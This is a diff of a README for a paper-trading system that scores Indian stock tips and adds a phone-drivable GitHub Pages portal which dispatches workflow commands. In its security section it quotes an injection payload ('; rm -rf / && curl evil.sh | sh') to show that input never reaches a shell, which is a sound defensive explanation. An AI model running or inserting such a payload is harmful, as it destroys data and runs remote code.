@@ -1,6 +1,10 @@
 # stock-tips-system
 
-A self-learning pipeline that gathers Indian stock tips from cluttered public sources, vets them with its own technical analysis, gives each an exact entry / stop-loss / three stepped targets, scores the source's track record, and paper-trades ₹1,00,000 in rotation — twice a day, unattended, from a scheduled Claude task.
+A self-learning desk that gathers Indian stock tips from cluttered public sources, vets them with its own
+technical analysis, gives each an exact entry, stop-loss and three stepped targets **with a date on each
+target**, scores every tipster by what they actually delivered, and paper-trades ₹1,00,000 in rotation —
+twice a day, unattended, from a scheduled Claude task, and on demand from a portal you can drive from
+your phone.
 
 **Status: paper trading.** Nothing here places real orders. The point of the first months is to build a track record you can trust (`state/ledger.json`, `state/sources_confidence.json`) before any broker integration.
 
@@ -40,10 +44,14 @@ state/                   the brain — committed on every run
   ledger.json            paper positions, closed trades, equity curve
   sources_confidence.json per-source score / hit-rates / expectancy / auto-disable
   lessons.md             machine + analyst lessons, appended daily
+  actions_log.json       the last 20 commands the portal ran, with their output
+  price_cache.json       last 60 closes per symbol, for the portal's charts (market data, not a record)
   universe_cache.json    NSE symbol master (weekly refresh, seed in data/EQUITY_L.csv)
 reports/<date>/          tips_raw.json → tips_reviewed.json → tips_structured.json → analysis.json → picks.json → morning.md / eod.md
 prompts/                 analyst_persona.md (loaded every run), morning_run.md, eod_run.md (the scheduled-task playbooks)
-docs/                    static dashboard (GitHub Pages): index.html reads data.json — the book, suggestions, and the three controls that queue a CLI command
+docs/                    the portal (GitHub Pages): index.html + data.json + manifest — five tabs, and every CLI command as a button
+.github/workflows/       desk.yml — the workflow the portal dispatches to run a command and commit the result
+scripts/                 desk_command.py (env → argv, no shell), record_run.py (the visible action log)
 src/stocktips/           the package — data/, sources/, analysis/, portfolio/, learning/, pipeline.py, report.py, cli.py
 tests/                   ledger lifecycle, extraction, plan geometry (no network)
 ```
@@ -61,6 +69,8 @@ python -m stocktips book CGPOWER           # formalise one analysed suggestion i
 python -m stocktips book CGPOWER --capital 25000   # ...with an explicit allocation
 python -m stocktips close CGPOWER          # discretionary exit: cancel a pending position, or sell an open one
 python -m stocktips capital --add 50000    # move the capital base (recorded as a dated ledger event)
+python -m stocktips add-tip --source manual:mohan --symbol TATASTEEL \
+       --target "195,210" --stop 168 --timeframe monthly --text "<the original message>"
 python -m stocktips analyze-symbol TATASTEEL --tf weekly
 python -m stocktips add-source --kind telegram --id tg_foo --channel foo --name "Telegram — @foo"
 python -m stocktips lesson "Breakouts on 1.5x volume kept failing in a falling Nifty — require Nifty > 20EMA for breakout picks."
@@ -75,56 +85,98 @@ Every candidate gets three independent 0–100 numbers. **TA confidence** starts
 
 Stops go a hair below the nearest qualifying swing support (≥ 0.6 ATR away, ≤ 8%), else 1.5 ATR (weekly) / 2.5 ATR (monthly). Targets go to successive swing resistances when one sits in the expected band, else 1.5 / 3 / 4.5 ATR (weekly) or 3 / 5 / 8 ATR (monthly); the 52-week high is a natural T3 when it is in reach. Exits are stepped 40/30/30 with the stop trailing to breakeven after T1 and to T1 after T2. A weekly idea that hasn't hit T1 in 10 trading days (30 for monthly) is time-stopped: exited if the fundamentals score is < 65 ("hot potato"), parked in the HOLD bucket if ≥ 65.
 
-## The dashboard
+## The portal
 
-`docs/index.html` is one self-contained page (vanilla JS, Chart.js from cdnjs, Newsreader + IBM Plex from
-Google Fonts) reading `docs/data.json`. It separates the two things that must never be confused:
+`docs/index.html` is one self-contained page — vanilla JS, Chart.js from cdnjs, Manrope and JetBrains
+Mono from Google Fonts — reading `docs/data.json`. Five tabs, dark by default, installable to a phone
+home screen, and everything the CLI can do is a button on it.
 
-* **The book** — what the ledger actually tracks: pending, open and hold positions with entry, quantity,
-  stop, T1/T2/T3 (a tick on each target already hit), last price, P&L, horizon and time-stop date. Every
-  row opens into the scores it was booked on, its patterns, its exits and its notes.
-* **Suggestions** — every BUY-grade name from the latest `analysis.json` that is *not* in the book,
-  whether or not there is capital for it. Filterable by horizon, by what is affordable today, and by
-  symbol or source. Each row opens into the TA reasons with their point contributions, the tape (RSI,
-  ADX, ATR, volume, distance from the 52-week high), the fundamentals breakdown, and the tip itself —
-  including a **Tipster said** column that carries the source's claimed target and stop and is never used
-  as a level.
+```
+The book    positions with a 60-session price chart, the plan drawn across it, and a target ladder
+Ideas       every BUY-grade name not in the book, sorted by which should pay first
+Journal     equity curve, closed trades, capital flows, the lessons file
+Sources     the confidence table — what each tipster has actually earned
+Console     connect GitHub, run the pipeline, paste a tip, move capital, record a lesson
+```
 
-A figures band across the top carries equity, the time-weighted return, deployable cash, position count,
-realised P&L and the per-stock ceiling.
+### When each target should land
 
-### The three controls
+Three targets with no dates are three hopes, so every level carries an estimate in trading sessions,
+derived from how the stock actually travels:
 
-GitHub Pages is static, so no button writes `state/ledger.json`. Each one checks the live caps, queues the
-intent in `localStorage`, and prints the single command that commits it. The queue entry clears itself the
-moment `data.json` comes back reflecting it, so the ledger is always the only source of truth.
+| | |
+|---|---|
+| `amplitude_pct_day` | the median absolute daily move — the distance a session usually covers |
+| `efficiency` | Kaufman's ratio: net move ÷ sum of the individual moves. 1.0 is a straight line, 0.1 is chop that ends where it began |
+| `drift_pct_day` | their product — the net progress a session is worth in the trend's direction |
+| `eta_days` | `target_pct ÷ drift`, capped at three clocks |
+| `momentum_score` | 0–100 from the drift, so the fast movers sort to the top |
 
-| Control | Where | Command it prints |
-|---|---|---|
-| **Take** | a suggestion | `python -m stocktips book V2RETAIL --capital 19668` |
-| **Exit** / **Cancel** | a position | `python -m stocktips close CGPOWER --note "..."` |
-| **Add capital** | the figures band | `python -m stocktips capital --add 50000` |
+A ±2%/day stock that ends the month where it started scores 0.06 efficiency and a drift near zero; a
+clean 0.8%/day trend scores 1.0 and 0.8. Same daily amplitude, opposite verdict — which is the whole
+point, because the first one will never reach its target inside a 10-session clock.
+
+The plan scores that too: **+6** when T1 sits well inside the time stop, **−10** when the pace cannot
+get there. Right direction, wrong clock is the most common way a good-looking idea dies.
+
+Positions carry their entry-time ETA, so the book can say *"session 14 of the ~9 its pace needed"* and
+flag a trade running late before the clock does.
+
+### Tags
+
+Derived from the numbers, each carrying its evidence in the tooltip: **Fundamentals** / **Sound books**,
+**Chart** / **Clean chart**, **Fast mover**, **Asymmetric**, **Tight stop**, **N sources**,
+**Strong uptrend** — and the warnings: **Weak books**, **Sluggish**, **Beats the clock?**,
+**Hot potato**. Filter the Ideas tab by them.
+
+### The buttons actually run the system
+
+GitHub Pages is static, so the page asks GitHub to do the work:
+
+```
+browser  ──dispatch──▶  .github/workflows/desk.yml  ──▶  scripts/desk_command.py
+                                                            │
+                                              python -m stocktips <command>
+                                                            │
+                          commit to main ◀── dashboard-data ─┘ ── state/actions_log.json
+                                │
+                          Pages redeploys ──▶ the page re-reads data.json and re-renders
+```
+
+Paste a fine-grained token (scoped to this one repository, **Contents: read and write** +
+**Actions: read and write**) into Console → Connection. It is kept in that browser's localStorage and
+sent only to `api.github.com`. Then **Take**, **Exit**, **Cancel**, **Deposit**, **Withdraw**,
+**Log a tip**, **Lesson**, and the whole pipeline — `morning`, `eod`, `analyze`, `pick`,
+`dashboard-data` — all run from the page, and it refreshes itself when the run lands.
+
+Without a token every button still works: it queues the intent locally and hands you the CLI line.
+
+**Browser input never reaches a shell.** `scripts/desk_command.py` maps environment variables onto an
+argv list against a fixed spec, so a `--note` of `"; rm -rf / && curl evil.sh | sh #"` is one string
+argument and stays one. Commands outside the spec, missing required inputs, and flags a command does
+not accept are all refused before anything runs. `scripts/record_run.py` appends every run to
+`state/actions_log.json`, so the last twenty actions are visible on the page with no token at all.
 
 ### Capital and the honest return
 
 `capital.total_inr` in settings.yaml only *seeds* a new ledger. After that `capital_inr` in
-`state/ledger.json` is the live base, and it moves only through `stocktips capital`, which appends a dated
-entry to `cash_flows`. Every percentage rule — 50% per stock, the 15% minimum position — is a percentage of
-that live base, so a top-up widens them.
+`state/ledger.json` is the live base, moved only by `stocktips capital`, which appends a dated entry to
+`cash_flows`. Every percentage rule — 50% per stock, the 15% minimum position — is a percentage of that
+live base, so a top-up widens them.
 
-Return is **time-weighted**: each sub-period of the equity curve is chained against its own opening base,
-where the base is the previous close plus whatever capital arrived since. Without that, adding ₹50,000 to a
-₹1,00,000 book would read as a +50% day and every later number would be measured against the wrong base.
-`stats()` also reports `simple_return_pct` beside it for reference.
+Return is **time-weighted**: each sub-period of the equity curve is chained against its own opening
+base, where the base is the previous close plus whatever capital arrived since. Without that, adding
+₹50,000 to a ₹1,00,000 book would read as a +50% day and every later number would be measured against
+the wrong base.
 
 ### Discretionary exits
 
-The plan's own exits — stop, stepped targets, time stop — run in the EOD run without you. `close` is for
-the other case: freeing capital because a better idea arrived. A *pending* position was never filled, so it
-is cancelled and its capital returned, and **no outcome is attributed to the source** — nothing happened.
-An *open* or *hold* position is sold at the last close (or `--price`) and recorded as `manual_exit`: the
-realised return counts towards the source's expectancy, but its score is left alone, because the tip did
-not resolve — it was pre-empted.
+The plan's own exits — stop, stepped targets, time stop — run in the evening without you. `close` is
+for the other case: freeing capital because a better idea arrived. A **pending** position was never
+filled, so it is cancelled and its capital returned, and no outcome is attributed to the source —
+nothing happened. An **open** or **hold** position sells at the last close (or `--price`) and is
+recorded as `manual_exit`: the realised return counts towards the source's expectancy, but its score is
+left alone, because the tip did not resolve — it was pre-empted.
 
 ## Adding sources
 
